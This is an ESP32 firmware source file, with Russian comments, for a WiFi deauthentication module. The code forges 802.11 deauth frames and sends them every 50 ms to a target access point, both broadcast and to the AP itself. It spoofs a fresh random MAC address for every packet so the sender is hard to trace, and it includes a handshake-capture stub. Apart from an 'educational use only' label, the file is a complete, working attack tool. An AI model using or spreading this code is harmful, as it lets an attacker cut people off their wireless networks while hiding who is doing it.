// File: src/modules/wifi_deauther.cpp
// ChiperOS v1 BETA - WiFi Deauther Module with Per-Packet MAC Rotation
// Educational purposes only

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include "modules.h"

// ======== НАСТРОЙКИ ========
#define STATIC_MAC            "e4:5f:01:9a:c2:7b"
#define USE_STATIC_MAC        false   // true = использовать STATIC_MAC, false = рандом каждый пакет
#define DEAUTH_INTERVAL_MS    50      // Интервал между пакетами (мс)
#define DEAUTH_REASON         0x0007  // Reason code: Class3 frame from non-assoc STA

// ======== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ========
uint8_t current_mac[6];
uint8_t target_bssid[6] = {0};        // По умолчанию - не задан
unsigned long lastDeauth = 0;
bool deautherActive = false;
uint16_t seq_counter = 0;

// ======== 802.11 DEAUTH FRAME STRUCTURE ========
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  da[6];   // Destination (client or broadcast)
    uint8_t  sa[6];   // Source (наш рандомный MAC)
    uint8_t  bssid[6];// BSSID (целевой AP)
    uint16_t seq_ctrl;
    uint16_t reason;
} __attribute__((packed)) deauth_frame_t;

// ======== ГЕНЕРАЦИЯ СЛУЧАЙНОГО МАК (ПЕРЕД КАЖДЫМ ПАКЕТОМ) ========
void generate_fresh_mac() {
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    
    // Byte 0: Local bit (bit 1) = 1, Multicast bit (bit 0) = 0
    current_mac[0] = 0x02;
    current_mac[1] = r1 & 0xFF;
    current_mac[2] = (r1 >> 8) & 0xFF;
    current_mac[3] = (r1 >> 16) & 0xFF;
    current_mac[4] = (r1 >> 24) & 0xFF;
    current_mac[5] = r2 & 0xFF;
    
    // Гарантируем локальный адрес
    current_mac[0] |= 0x02;
    current_mac[0] &= ~0x01;
}
void apply_mac_to_interface() {
    // Кратко выключаем promiscuous для смены MAC
    esp_wifi_set_promiscuous(false);
    delayMicroseconds(100);
    
    esp_wifi_set_mac(WIFI_IF_STA, current_mac);
    
    // Включаем обратно
    esp_wifi_set_promiscuous(true);
}

// ======== ОТПРАВКА ОДНОГО ДЕАУТ ПАКЕТА ========
void send_single_deauth(uint8_t* target_bssid, uint8_t* target_client) {
    // 1. Генерируем НОВЫЙ случайный MAC для этого пакета
    generate_fresh_mac();
    
    // 2. Применяем его к интерфейсу
    apply_mac_to_interface();
    
    // 3. Формируем пакет
    deauth_frame_t frame;
    frame.frame_control = 0xC000;  // Deauth frame, ToDS=0, FromDS=0
    frame.duration = 0;
    
    // Destination: если target_client=null → broadcast деаут
    if (target_client == nullptr) {
        memset(frame.da, 0xFF, 6);  // Broadcast
    } else {
        memcpy(frame.da, target_client, 6);
    }
    
    // Source: наш свежий рандомный MAC
    memcpy(frame.sa, current_mac, 6);
    
    // BSSID: целевой AP
    memcpy(frame.bssid, target_bssid, 6);
    
    // Sequence control (инкремент для валидности)
    frame.seq_ctrl = (seq_counter++ << 4) & 0xFFF0;
    
    // Reason code
    frame.reason = DEAUTH_REASON;
    
    // 4. Отправляем пакет в эфир
    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(deauth_frame_t), false);
    
    // Микро-задержка для стабильности радио
    delayMicroseconds(250);
}
// ======== ПАКЕТНАЯ ОТПРАВКА (с ротацией МАК на каждый пакет) ========
void send_deauth_burst() {
    if (memcmp(target_bssid, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
        return;  // Нет цели — не отправляем
    }
    
    // Пакет 1: Деаут всем клиентам (broadcast DA)
    send_single_deauth(target_bssid, nullptr);
    
    // Пакет 2: Деаут самому AP (DA = BSSID)
    send_single_deauth(target_bssid, target_bssid);
    
    Serial.print("[DEAUTH] Burst sent to ");
    Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
                  target_bssid[0], target_bssid[1], target_bssid[2],
                  target_bssid[3], target_bssid[4], target_bssid[5]);
}

// ======== ИНИЦИАЛИЗАЦИЯ (ПРАВИЛЬНАЯ ПОСЛЕДОВАТЕЛЬНОСТЬ) ========
void wifi_deauther_init() {
    Serial.println("[DEAUTHER] Initializing...");
    
    // 1. Устанавливаем временный стартовый MAC
    if (USE_STATIC_MAC) {
        sscanf(STATIC_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &current_mac[0], &current_mac[1], &current_mac[2],
               &current_mac[3], &current_mac[4], &current_mac[5]);
    } else {
        generate_fresh_mac();
    }
    
    // 2. Включаем WiFi в режиме STA (обязательно для esp_wifi_80211_tx)
    WiFi.mode(WIFI_MODE_STA);
    
    // 3. Запускаем WiFi стек
    esp_err_t err = esp_wifi_start();
    if (err != ESP_OK) {
        Serial.printf("[ERROR] esp_wifi_start failed: %d\n", err);
        return;
    }
    delay(100);
    
    // 4. Устанавливаем стартовый MAC (ДО promiscuous!)
    esp_wifi_set_promiscuous(false);
    delay(10);
    esp_wifi_set_mac(WIFI_IF_STA, current_mac);
    
    // 5. Настраиваем promiscuous фильтр (ловим всё)
    wifi_promiscuous_filter_t filter = {        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | 
                       WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_CTRL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    
    // 6. Включаем promiscuous режим
    esp_wifi_set_promiscuous(true);
    
    deautherActive = true;
    lastDeauth = millis();
    seq_counter = 0;
    
    Serial.println("[DEAUTHER] Ready! Per-packet MAC rotation ACTIVE");
    Serial.println("[LEGAL] Educational use only. Respect local laws.");
}

// ======== ОСНОВНОЙ ЦИКЛ ========
void wifi_deauther_loop() {
    if (!deautherActive) return;
    
    // Отправка с интервалом
    if (millis() - lastDeauth >= DEAUTH_INTERVAL_MS) {
        send_deauth_burst();  // Каждый вызов = новые MAC для каждого пакета
        lastDeauth = millis();
    }
    
    // Критично для ESP32-S3 RTOS
    yield();
}

// ======== ОСТАНОВКА ========
void wifi_deauther_stop() {
    if (!deautherActive) return;
    
    deautherActive = false;
    
    // Выключаем promiscuous
    esp_wifi_set_promiscuous(false);
    
    // Возвращаем стандартный режим
    WiFi.mode(WIFI_OFF);
    esp_wifi_stop();
    
    Serial.println("[DEAUTHER] Stopped. WiFi powered down.");
}

// ======== УСТАНОВКА ЦЕЛИ (BSSID) ========
void wifi_deauther_set_target(const char* bssid_str) {
    sscanf(bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",           &target_bssid[0], &target_bssid[1], &target_bssid[2],
           &target_bssid[3], &target_bssid[4], &target_bssid[5]);
    
    Serial.print("[DEAUTHER] Target set: ");
    Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X\n",
                  target_bssid[0], target_bssid[1], target_bssid[2],
                  target_bssid[3], target_bssid[4], target_bssid[5]);
}

// ======== ЗАХВАТ HANDSHAKE (заглушка) ========
void wifi_handshake_capture() {
    Serial.println("[DEAUTHER] Handshake capture mode (stub)");
    // Для полноценного захвата нужен callback на промискуас пакеты
}
